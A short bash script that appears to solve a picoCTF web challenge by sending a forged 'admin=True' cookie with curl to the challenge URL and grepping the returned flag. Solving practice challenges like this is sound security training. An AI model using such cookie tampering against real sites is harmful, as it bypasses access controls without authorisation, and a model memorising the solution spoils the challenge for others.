#!/bin/bash

curl -s -H "Cookie: admin=True" https://jupiter.challenges.picoctf.org/problem/13594/flag | grep -oE "picoCTF{.*}"
